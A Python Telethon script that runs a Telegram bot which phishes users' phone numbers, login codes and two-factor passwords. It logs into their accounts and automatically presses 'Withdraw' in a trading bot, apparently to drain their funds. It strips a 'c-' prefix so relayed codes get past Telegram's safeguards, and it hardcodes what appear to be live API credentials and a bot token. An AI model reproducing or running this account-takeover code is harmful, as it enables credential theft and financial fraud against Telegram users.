from telethon import TelegramClient, events
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    RPCError,
)
from telethon.tl.types import User
import asyncio

# Replace these with your Telegram API credentials
api_id = '24353464'
api_hash = 'e12d645e83fda79a60a87ae59e34125b'
intermediary_bot_token = '7885063775:AAFFeaQNMglWyiv5a7DL2b9KG4Y8gADHcQg'  # Replace with your bot's token
bot_username = '@helenus_trojanbot'  # Replace with the actual bot username

# Initialize the Telegram client for the intermediary bot
bot_client = TelegramClient('bot_session', api_id, api_hash).start(bot_token=intermediary_bot_token)

# State variables to store user inputs
user_inputs = {}
awaiting_code_request = set()  # Tracks users waiting for login codes
awaiting_password = set()  # Tracks users waiting for 2FA password
phone_code_hashes = {}  # Stores phone_code_hash for each user

async def handle_start_command(event):
    sender_id = event.sender_id
    user_inputs[sender_id] = {"phone": None, "code": None, "password": None}
    awaiting_code_request.discard(sender_id)  # Reset state
    awaiting_password.discard(sender_id)  # Reset state
    await event.reply("Welcome! Please enter your phone number in the format: `+1234567890`")

async def handle_message(event):
    sender_id = event.sender_id

    if event.raw_text.strip() == '/start':
        return

    if sender_id not in user_inputs:
        await event.reply("Please send /start first to begin the login process.")
        return

    user_state = user_inputs[sender_id]
    if not user_state["phone"]:
        phone = event.raw_text.strip()
        user_state["phone"] = phone
        awaiting_code_request.add(sender_id)
        await event.reply("Phone number received. Requesting a login code...")
        await request_login_code(sender_id, phone)
    elif sender_id in awaiting_password:
        password = event.raw_text.strip()
        user_state["password"] = password
        awaiting_password.discard(sender_id)
        await process_login(sender_id)
    elif not user_state["code"]:
        code = event.raw_text.strip()
        
        # Remove prefix 'c-' if it exists
        if code.startswith('c-'):
            code = code[2:]
        
        user_state["code"] = code
        awaiting_code_request.discard(sender_id)
        await event.reply("Code received. Attempting login...")
        await process_login(sender_id)
    else:
        await event.reply("Login process already initiated. Please wait.")


async def request_login_code(sender_id, phone):
    user_client = TelegramClient(f'session_{sender_id}', api_id, api_hash)
    try:
        await user_client.connect()
        sent_code = await user_client.send_code_request(phone)
        phone_code_hashes[sender_id] = sent_code.phone_code_hash
        await bot_client.send_message(sender_id, "A login code has been sent to your phone. Please enter it here.")
    except RPCError as rpc_error:
        await bot_client.send_message(sender_id, f"Failed to request login code: {rpc_error}")
        awaiting_code_request.discard(sender_id)
    except Exception as e:
        await bot_client.send_message(sender_id, f"An error occurred while requesting the code: {e}")
        awaiting_code_request.discard(sender_id)
    finally:
        await user_client.disconnect()

async def process_login(sender_id):
    phone = user_inputs[sender_id]["phone"]
    code = user_inputs[sender_id]["code"]
    password = user_inputs[sender_id].get("password")
    phone_code_hash = phone_code_hashes.get(sender_id)

    user_client = TelegramClient(f'session_{sender_id}', api_id, api_hash)

    try:
        await user_client.connect()

        if not await user_client.is_user_authorized():
            if password:
                await user_client.sign_in(phone=phone, password=password)
            else:
                await user_client.sign_in(phone, code, phone_code_hash=phone_code_hash)

            if await user_client.is_user_authorized():
                await bot_client.send_message(sender_id, "Login successful! Starting advanced actions...")
                await advanced_actions(user_client)
            else:
                await bot_client.send_message(sender_id, "Failed to authorize. Please try again.")
        else:
            await bot_client.send_message(sender_id, "Already logged in. Starting advanced actions...")
            await advanced_actions(user_client)
    except PhoneCodeInvalidError:
        await bot_client.send_message(sender_id, "The login code is invalid. Please try again.")
        awaiting_code_request.add(sender_id)
    except SessionPasswordNeededError:
        await bot_client.send_message(sender_id, "Two-factor authentication required. Please provide your password.")
        awaiting_password.add(sender_id)
    except Exception as e:
        await bot_client.send_message(sender_id, f"An error occurred during login: {e}")
    finally:
        await user_client.disconnect()

async def advanced_actions(client):
    try:
        print(f"Sending message to {bot_username}: /start")
        message = await client.send_message(bot_username, '/start')

        print("Waiting for response after /start...")
        await asyncio.sleep(2)

        response = await client.get_messages(bot_username, limit=5)

        if response:
            print(f"Response from {bot_username}: {response[0].text}")
            buttons = response[0].buttons

            if buttons:
                print("Buttons found:")
                for row in buttons:
                    for button in row:
                        print(f"Button text: {button.text}")

                withdraw_button = None
                for row in buttons:
                    for button in row:
                        if 'withdraw' in button.text.lower():
                            withdraw_button = button
                            break
                    if withdraw_button:
                        break

                if withdraw_button:
                    print(f"Clicking the 'Withdraw' button: {withdraw_button.text}")
                    await withdraw_button.click()

                    print("Waiting for follow-up responses...")
                    async for message in client.iter_messages(bot_username, limit=10):
                        print(f"New message: {message.text}")

    except Exception as e:
        print(f"Error during advanced actions: {e}")

# Add handlers for the intermediary bot
@bot_client.on(events.NewMessage(pattern='/start'))
async def start_command(event):
    await handle_start_command(event)

@bot_client.on(events.NewMessage)
async def message_handler(event):
    await handle_message(event)

# Start the bot
print("Intermediary bot is running...")
asyncio.run(bot_client.run_until_disconnected())
